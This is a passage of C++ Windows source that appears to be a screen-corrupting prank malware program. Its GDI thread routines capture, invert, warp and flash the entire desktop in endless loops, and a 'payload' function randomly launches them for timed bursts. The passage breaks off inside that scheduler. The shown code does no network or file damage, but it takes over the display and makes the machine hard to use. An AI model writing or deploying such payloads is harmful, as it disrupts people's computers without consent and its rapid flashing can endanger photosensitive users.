			StretchBlt(hcdc, -2 + rand() % 5, yyy, w, rndsize, hcdc, 0, yyy, w, rndsize, SRCCOPY);
		}
		for (int x = 0; x <= w; x += blocksize) {
			for (int y = 0; y <= h; y += blocksize) {
				int rndx = x + (-1 + rand() % 3), rndy = y + (-1 + rand() % 3);
				int rndx2 = x + (-1 + rand() % 3), rndy2 = y + (-1 + rand() % 3);
				int luckynum = 1 + rand() % 11, rop = SRCCOPY;
				if (luckynum == 5) { rop = SRCAND; }
				else if (luckynum == 10) { rop = SRCPAINT; }
				StretchBlt(hcdc, rndx, rndy, blocksize, blocksize, hcdc, rndx2, rndy2, blocksize, blocksize, rop);
			}
		}
		for (int i = 0; i < w * h; i++) {
			rgbScreen[i].rgb += i * h + xxx & (i % w + i / w) * i & (w + h) + xxx;
		}
		if (rand() % 8 >= 5) { BitBlt(hcdc, rand() % 4, rand() % 4, w, h, hcdc, rand() % 4, rand() % 4, SRCAND); }
		if (rand() % 10 >= 6) {
			point[0].x = increment; point[0].y = -increment;
			point[1].x = w + increment; point[1].y = increment;
			point[2].x = -increment; point[2].y = h - increment;
		}
		else {
			point[0].x = -increment; point[0].y = increment;
			point[1].x = w - increment; point[1].y = -increment;
			point[2].x = increment; point[2].y = h + increment;
		}
		PlgBlt(hcdc, point, hcdc, 0, 0, w, h, 0, 0, 0);
		BitBlt(hcdc, rand() % 10, rand() % 10, w, h, hcdc, rand() % 10, rand() % 10, NOTSRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		blocksize += 2; if (blocksize >= 200) { blocksize = 80; }
		Sleep(10);
	}
}

DWORD WINAPI train(LPVOID lpParam) {
	int xxx = 0;
	while (1) {
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		int rndsize = 1 + rand() % (h / 2);
		HDC hdc = GetDC(0);
		HDC hcdc = CreateCompatibleDC(hdc);
		BITMAPINFO bmi = { 0 };
		PRGBQUAD rgbScreen = { 0 };
		bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
		SelectObject(hcdc, hBitmap);
		StretchBlt(hcdc, 0, 0, w, h, hcdc, 0, 0, 1, 1, WHITENESS);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / h;
			rgbScreen[i].rgb <<= (xxx + ((xxx + x) + i)) * ((xxx + y) - i);
		}
		for (int yyy = 0; yyy < h; yyy += rndsize) {
			StretchBlt(hcdc, -2 + rand() % 5, yyy, w, rndsize, hcdc, 0, yyy, w, rndsize, SRCCOPY);
		}
		StretchBlt(hcdc, 0, 0, w + 1200, h + 850, hcdc, 0, 0, w - 1200, h - 850, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc);
		DeleteDC(hdc);
		Sleep(1);
		xxx++;
	}
}

DWORD WINAPI darkpixel(LPVOID lpParam) {
	while (1)
	{
		HDC hdc = GetDC(NULL);
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		HBITMAP hbm = CreateCompatibleBitmap(hdc, w, h);
		HDC hdcTemp = CreateCompatibleDC(hdc);
		HBITMAP hbmOld = (HBITMAP)SelectObject(hdcTemp, hbm);
		BitBlt(hdcTemp, 0, 0, w, h, hdc, 0, 0, SRCPAINT);
		int numShifts = 600;
		for (int i = 0; i < numShifts; i++)
		{
			int a = rand() % w;
			int b = rand() % h;
			BitBlt(hdcTemp, a, b, 200, 200, hdcTemp, a + rand() % 21 - 10, b + rand() % 21 - 10, SRCAND);
		}
		BitBlt(hdc, 0, 0, w, h, hdcTemp, 0, 0, NOTSRCCOPY);
		SelectObject(hdcTemp, hbmOld);
		DeleteDC(hdcTemp);
		DeleteObject(hbm);
		ReleaseDC(NULL, hdc);
	}
}

DWORD WINAPI train1(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			int xmm = x + y ^ y - x;
			int ymm = x - y * y + x;
			rgbScreen[i].r += xmm;
			rgbScreen[i].g -= ymm;
			rgbScreen[i].b += xmm + ymm;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, NOTSRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI invcc(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		int x = rand() % w, y = rand() % h;
		HRGN hrgn = CreateEllipticRgn(x, y, x + 300, y + 300);
		SelectClipRgn(hdc, hrgn);
		HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 1000, rand() % 1000, rand() % 1000));
		SelectObject(hdc, hBrush);
		BitBlt(hdc, x, y, w, h, hdc, x, y, PATINVERT);
		DeleteObject(hrgn); DeleteObject(hBrush);
		Sleep(100);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI shader1(LPVOID lpParam) {
	int i = 0;
	while (true) {
		HDC hdc = GetDC(0);
		HDC hcdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		BITMAPINFO bmpi = { 0 };
		bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
		RGBQUAD* rgbquad = NULL;
		HSL hslcolor; RGBQUAD rgbquadCopy;
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(hcdc, hBitmap);
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				rgbquad[index].rgbRed += (i | x * i | y) + i;
				rgbquad[index].rgbGreen -= (i + x | i + y) + i;
				rgbquad[index].rgbBlue += (i | x + i ^ y) + i;
			}
		}
		for (int bl = 0; bl < h; bl += 1) {
			StretchBlt(hcdc, -2 + rand() % 5, bl, w, 1, hcdc, 0, bl, w, 1, NOTSRCCOPY);
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hdc); DeleteDC(hcdc);
		i += 2;
	}
}
DWORD WINAPI up(LPVOID lpParam) {
	HWND desktop = GetDesktopWindow();
	RECT wRect;
	GetWindowRect(desktop, &wRect);
	POINT wPt[3];
	HDC hdc = GetDC(0);
	int ScrW = GetSystemMetrics(SM_CXSCREEN), ScrH = GetSystemMetrics(SM_CYSCREEN);
	int y = rand() % ScrH, h = ScrH - rand() % ScrH - (ScrH / 2 - 109);
	int w = wRect.right - wRect.left;
	int r = wRect.bottom - wRect.top;
	int x = GetSystemMetrics(0), p = GetSystemMetrics(1);

	while (1)
	{
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left + 21 + 11;
		wPt[0].y = wRect.top + 90 + 30;
		wPt[1].x = wRect.right - 67 - 404;
		wPt[1].y = wRect.top + 71 - 69;
		wPt[2].x = wRect.left + 54 + 34;
		wPt[2].y = wRect.bottom - 75 - 40;
		PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left + 21 + 11;
		wPt[0].y = wRect.top + 15 - 30;
		wPt[1].x = wRect.right + 61 - 51;
		wPt[1].y = wRect.top - 31 + 49;
		wPt[2].x = wRect.left - 84 - 83;
		wPt[2].y = wRect.bottom - 75 - 50;
		PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
		y = rand() % ScrH, h = ScrH - rand() % ScrH - (ScrH / 2 - 109);
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 666, rand() % 666, rand() % 666)));
		PatBlt(hdc, 0, y, ScrW, h, PATINVERT);
		StretchBlt(hdc, 50, 50, w - 100, r - 100, hdc, 0, 0, w, r, NOTSRCCOPY);
		BitBlt(hdc, rand() % (x - 0), rand() % (p - 0), rand() % (x - 0), rand() % (p - 0), hdc, rand() % (x - 0), rand() % (p - 0), SRCCOPY);
		PatBlt(hdc, 0, 0, x, y, PATINVERT);
	}
}

DWORD WINAPI blur(LPVOID lpParam) {
	HWND hDesktopWindow;
	HDC hDesktopDC;
	RECT Rect;

	while (TRUE) {
		hDesktopWindow = GetDesktopWindow();
		hDesktopDC = GetWindowDC(hDesktopWindow);
		GetWindowRect(hDesktopWindow, &Rect);

		for (int i = 0; i <= 1899; ++i)
			StretchBlt(hDesktopDC, i, i, Rect.right - i, Rect.bottom - i, hDesktopDC, i, i, Rect.right, Rect.bottom, NOTSRCCOPY);
		ReleaseDC(hDesktopWindow, hDesktopDC);
		Sleep(1000);
	}
}

DWORD WINAPI ballz(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);


	while (1)
	{
		hdc = GetDC(NULL);
		// Create an array of TRIVERTEX structures that describe
// positional and color values for each vertex.
		TRIVERTEX vertex[3];
		vertex[0].x = rand() % w;
		vertex[0].y = rand() % h;
		vertex[0].Red = 0x8000;
		vertex[0].Green = 0x6000;
		vertex[0].Blue = 0x5000;
		vertex[0].Alpha = 0x0000;

		vertex[1].x = rand() % w;
		vertex[1].y = rand() % h;
		vertex[1].Red = 0x9f00;
		vertex[1].Green = 0x8000;
		vertex[1].Blue = 0x6700;
		vertex[1].Alpha = 0x0000;

		vertex[2].x = rand() % w;
		vertex[2].y = rand() % h;
		vertex[2].Red = 0xff00;
		vertex[2].Green = 0xff00;
		vertex[2].Blue = 0xff00;
		vertex[2].Alpha = 0x0000;

		// Create a GRADIENT_TRIANGLE structure that
		// references the TRIVERTEX vertices.
		GRADIENT_TRIANGLE gTriangle;
		gTriangle.Vertex1 = 0;
		gTriangle.Vertex2 = 1;
		gTriangle.Vertex3 = 2;

		// Draw a shaded triangle.
		GradientFill(hdc, vertex, 3, &gTriangle, 1, GRADIENT_FILL_TRIANGLE);
		ReleaseDC(0, hdc);
		Sleep(1);
	}

	return 0x00;
}
DWORD WINAPI rotate(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	HDC hdc, hdcMem;
	HBITMAP hbm;
	for (int i = 0;; i++, i %= 3)
	{
		hdc = GetDC(0);
		hdcMem = CreateCompatibleDC(hdc);
		hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcMem, hbm);
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; w * h > i; i++)
		{
			int v = 2 + rand() % 30;
			((BYTE*)(data + i))[2] = ((BYTE*)(data + i + v + 22))[2] + 6.7;
			((BYTE*)(data + i))[1] = ((BYTE*)(data + i + v + 22))[1] + 6.7;
			((BYTE*)(data + i))[4] = ((BYTE*)(data + i + v + 22))[4] + 6.7;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcMem);
		DeleteObject(hdc);
	}
}
DWORD WINAPI plgblt1(LPVOID lpParam) {
	HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	BITMAPINFO bmi = { 40, sw, sh, 1, 24 };
	PRGBTRIPLE rgbtriple;
	for (;;) {
		desk = GetDC(0);
		HDC deskMem = CreateCompatibleDC(desk);
		HBITMAP scr = CreateDIBSection(desk, &bmi, 0, (void**)&rgbtriple, 0, 0);
		SelectObject(deskMem, scr);
		BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
		for (int i = 0; i < sw * sh; i++) {
			//int x = i % sw, y = i / sh, t = y ^ y | x;
			int sepiaRed = round(.420 * rgbtriple[i].rgbtRed + .404 * rgbtriple[i].rgbtGreen + .333 * rgbtriple[i].rgbtBlue);
			int sepiaGreen = round(.670 * rgbtriple[i].rgbtRed + .676 * rgbtriple[i].rgbtGreen + .380 * rgbtriple[i].rgbtBlue);
			int sepiaBlue = round(.690 * rgbtriple[i].rgbtRed + .677 * rgbtriple[i].rgbtGreen + .390 * rgbtriple[i].rgbtBlue);

			if (sepiaBlue > 255)
			{
				sepiaBlue = 255;
			}

			if (sepiaRed > 255)
			{
				sepiaRed = 255;
			}

			if (sepiaGreen > 255)
			{
				sepiaGreen = 255;
			}
			rgbtriple[i].rgbtRed *= sepiaRed;
			rgbtriple[i].rgbtGreen *= sepiaGreen;
			rgbtriple[i].rgbtBlue *= sepiaBlue;
		}
		BitBlt(desk, 0, 0, sw, sh, deskMem, 0, 0, NOTSRCCOPY);
		ReleaseDC(wnd, desk);
		DeleteDC(desk); DeleteDC(deskMem); DeleteObject(scr); DeleteObject(wnd); DeleteObject(rgbtriple); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&bmi);
		//Sleep(100);
		if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
	}
}
DWORD WINAPI shader2(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;
	int angle = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				rgbquad[index].rgbRed += x;
				rgbquad[index].rgbGreen += y;
				rgbquad[index].rgbBlue += (x + i)*y;
			}
		}

		i++;
		//StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		int a = 100 * tan(M_PI + angle);
		int b = 10 * cos(M_PI + angle);
		BitBlt(hdc, a, b, w, h, hdcCopy, 0, 0, NOTSRCCOPY);
		angle += 1;
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}

	return 0x00;
}


DWORD WINAPI up1(LPVOID lpParam) {
	srand(time(NULL));
	int xxx = 0;
	while (true) {
		HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		BITMAPINFO bmi = { 0 };
		bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
		RGBQUAD* pBits = nullptr;
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
		SelectObject(hcdc, hBitmap);
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y + x * h;
				double wave = cos((x + xxx) * 0.01) + sin((y + xxx) * 0.01);
				pBits[index].rgbRed += (512 * sin(wave) * 0.75);
				pBits[index].rgbGreen += (512 * tan(wave) * 1.25);
				pBits[index].rgbBlue += (512 * cos(wave) * 1.75);
			}
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		xxx += 20;
		Sleep(1);
	}
}
DWORD WINAPI cur1(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1), radius2 = 500.0f; // what the fuck float value
	double moveangle = 0;
	while (1) {
		desk = GetDC(0);
		int radius = 100, rx = rand() % sw, ry = rand() % sh;
		SetTextColor(desk, RGB(rand() % 666, rand() % 666, rand() % 666));
		SetBkColor(desk, RGB(rand() % 666, rand() % 666, rand() % 666));
		double ax = cos(moveangle) * radius2, ay = sin(moveangle) * radius2;
		StretchBlt(desk, ax, ay, sw, sh, desk, 0, 0, sw, sh, SRCCOPY);
		moveangle = fmod(moveangle + M_PI / radius2, M_PI * radius2);
		for (int t = 5; t < sw + sh; t++, t += 10) {
			int x = (int)(float)(radius + t / tan(t + radius * 10)) + rx,
				y = (int)(float)(radius + t / sin(t + radius * 10)) + ry;
			TextOutW(desk, x, y, L"No Skid", wcslen(L"No Skid"));
		}
		Sleep(10);
		if (rand() % 10 == 4) InvalidateRect(0, 0, 0);
	}
}

DWORD WINAPI shader3(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;
	INT xxx = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				int fx = xxx * ((x + i) * (y + i));

				rgbquad[index].rgbRed ^= fx;
				rgbquad[index].rgbGreen = fx;
				rgbquad[index].rgbRed += fx;
			}
		}

		i++;
		xxx += 4;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI sines(LPVOID lpParam) {
	HDC desk = GetDC(0);
	RECT wRect;
	POINT wPt[3];
	while (true)
	{
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left + 61 + 61;
		wPt[0].y = wRect.top + 62 + 60;
		wPt[1].x = wRect.right + 69 + 6;
		wPt[1].y = wRect.top + 61 + 67;
		wPt[2].x = wRect.left - 64 - 67;
		wPt[2].y = wRect.bottom - 62 - 60;
		PlgBlt(desk, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
	}
}

DWORD WINAPI merge(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;

			int fx = i + (i * sin(cbrt(x * y) / 62.0));
			rgbScreen[i].r += (25);
			rgbScreen[i].g += (fx);
			rgbScreen[i].b += (60);
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI asterisk(LPVOID lpParam) {
	while (1) {
		int width, height;
		HWND hwnd;
		//Magnetar
		width = GetSystemMetrics(SM_CXSCREEN);
		height = GetSystemMetrics(SM_CYSCREEN);
		hwnd = GetDesktopWindow();    HDC hdc = GetDC(NULL);
		RECT rekt;
		GetWindowRect(hwnd, &rekt);
		HBRUSH rainbow = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, rainbow);
		int xyrng = rand() % width, h = height - rand() % width - (width / 2 - 110);

		POINT pt3[3];
		int inc3 = 60;
		inc3++;
		pt3[0].x = rekt.left + inc3;
		pt3[0].y = rekt.top - inc3;
		pt3[1].x = rekt.right + inc3;
		pt3[1].y = rekt.top + inc3;
		pt3[2].x = rekt.left - inc3;
		pt3[2].y = rekt.bottom - inc3;

		PlgBlt(hdc, pt3, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, NULL, NULL, NULL);
		PlgBlt(hdc, pt3, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, NULL, NULL, NULL);

		BitBlt(hdc, xyrng, height, xyrng, h, hdc, rand() % 100 - 50, xyrng, NOTSRCCOPY);
		PatBlt(hdc, xyrng, height, xyrng, h, PATINVERT);

		StretchBlt(hdc, -16, -16, width + 32, height + 32, hdc, NULL, NULL, width, height, SRCPAINT);
		StretchBlt(hdc, 16, 16, width - 32, height - 32, hdc, NULL, NULL, width, height, SRCAND);
	}
}

DWORD WINAPI sines1(LPVOID lpParam) {
	for (;;)
	{
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(0);
		int	y = GetSystemMetrics(1);
		BITMAPINFO bitmapinfo = { 40UL, x, y, 1, 24 };
		PRGBTRIPLE colorrgb;
		HBITMAP hbitmap = CreateDIBSection(hdc, &bitmapinfo, 0, (void**)&colorrgb, 0, 0);
		HDC DESKTOPBITMAP = CreateCompatibleDC(hdc);
		SelectObject(DESKTOPBITMAP, hbitmap);
		BitBlt(DESKTOPBITMAP, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < x * y; i++) {
			int v = i % x ^ v | x;
			int	i1 = i / y ^ v | y;
			int	r = i1 ^ i1 | (v * i1);
			colorrgb[i].rgbtBlue += v ^ i1 | i * i * 5;
			colorrgb[i].rgbtGreen *= v ^ i1 | i - i * 5;
			colorrgb[i].rgbtRed += v ^ i1 | i + i * 5;
		}
		BitBlt(hdc, 0, 0, x, y, DESKTOPBITMAP, 0, 0, NOTSRCCOPY);
		ReleaseDC(0, hdc);
		DeleteDC(hdc);
		DeleteDC(DESKTOPBITMAP);
		DeleteObject(hbitmap);
		DeleteObject(colorrgb);
		DeleteObject(&x);
		DeleteObject(&y);
		DeleteObject(&bitmapinfo);
	}

}

DWORD WINAPI lines(LPVOID lpParam) {
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	while (true) {
		HDC hdc = GetDC(0);
		int y = rand() % sh;
		int h = sh - rand() % sh - (sh / 1 - 8);
		int ColorRefReq = (rand() % 255) << 8;
		int ColorRef = (ColorRefReq | (rand() % 255)) << 8;
		HBRUSH brush = CreateSolidBrush(ColorRef | rand() % 255);
		SelectObject(hdc, brush);
		BitBlt(hdc, 0, y, sw, h, hdc, rand() % 100 - 60, y, MERGECOPY);
		PatBlt(hdc, -1, y, sw, h, PATINVERT);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI omg(LPVOID lpvd) {
	HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	BITMAPINFO bmi = { 40, sw, sh, 1, 24 };
	PRGBTRIPLE rgbtriple;

	for (;;) {
		desk = GetDC(0);
		HDC deskMem = CreateCompatibleDC(desk);
		HBITMAP scr = CreateDIBSection(desk, &bmi, 0, (void**)&rgbtriple, 0, 0);
		SelectObject(deskMem, scr);
		BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
		for (int i = 0; i < sw * sh; i++) {
			int x = i % sw, y = i / sh + x ^ y >> sw / sh, t = y ^ y | x >> sw;
			rgbtriple[i].rgbtBlue += t + GetBValue(x ^ y | t) + 3;
			rgbtriple[i].rgbtRed += x + GetRValue(t ^ y | x) + 5;
			rgbtriple[i].rgbtGreen += y + GetGValue(x ^ t | y) + 7;
		}
		BitBlt(desk, 0, 0, sw, sh, deskMem, 0, 0, SRCCOPY);
		ReleaseDC(wnd, desk);
		DeleteDC(desk); DeleteDC(deskMem); DeleteObject(scr); DeleteObject(wnd); DeleteObject(rgbtriple); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&bmi);
	}
}

DWORD WINAPI shuffle(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	HDC mdc = CreateCompatibleDC(hdc);
	HBITMAP hbit = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(mdc, hbit);
	BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
	for (int t = 0; ; t -= 40) {
		hdc = GetDC(0);
		for (int y = 0; y <= h; y++) {
			float x = sin((y + t) * (M_PI / 300)) * 25;
			BitBlt(hdc, x, y, w, 1, mdc, 0, y, NOTSRCCOPY);
		}
		ReleaseDC(0, hdc); DeleteObject(hdc);
	}
	ReleaseDC(0, mdc); DeleteObject(mdc);
	DeleteObject(hbit);
}


DWORD WINAPI payload(LPVOID lpParam) {
	tagRECT tag;
	__time64_t bruh = time((__time64_t*)0x0);
	srand((int)bruh);
	while (true) {
		HWND hwnd = GetForegroundWindow();
		GetWindowRect(hwnd, &tag);
		int count = rand() % 15 + 1;
		if (count == 15) {
			HANDLE thread1 = CreateThread(0, 0, plgblt, 0, 0, 0);
			HANDLE thread1dot1 = CreateThread(0, 0, textout, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			TerminateThread(thread1dot1, 0);
			CloseHandle(thread1dot1);
		}
		if (count == 14) {
			HANDLE thread2 = CreateThread(0, 0, profect, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
		}
		if (count == 13) {
			HANDLE thread3 = CreateThread(0, 0, train, 0, 0, 0);
			HANDLE thread3dot1 = CreateThread(0, 0, darkpixel, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			TerminateThread(thread3dot1, 0);
			CloseHandle(thread3dot1);
		}
		if (count == 12) {
			HANDLE thread4 = CreateThread(0, 0, train1, 0, 0, 0);
			HANDLE thread4dot1 = CreateThread(0, 0, invcc, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			TerminateThread(thread4dot1, 0);
			CloseHandle(thread4dot1);
		}
		if (count == 11) {
			HANDLE thread5 = CreateThread(0, 0, shader1, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
		}
		if (count == 10) {
			HANDLE thread6 = CreateThread(0, 0, up, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
		}
		if (count == 9) {
			HANDLE thread7 = CreateThread(0, 0, blur, 0, 0, 0);
			HANDLE thread7dot1 = CreateThread(0, 0, ballz, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread7, 0);
			CloseHandle(thread7);
			TerminateThread(thread7dot1, 0);
			CloseHandle(thread7dot1);
		}
		if (count == 8) {
			HANDLE thread8 = CreateThread(0, 0, rotate, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread8, 0);
			CloseHandle(thread8);
		}
		if (count == 7) {
			HANDLE thread9 = CreateThread(0, 0, plgblt1, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread9, 0);
			CloseHandle(thread9);
		}
		if (count == 6) {
			HANDLE thread10 = CreateThread(0, 0, shader2, 0, 0, 0);
			Sleep(rand() % 30000);
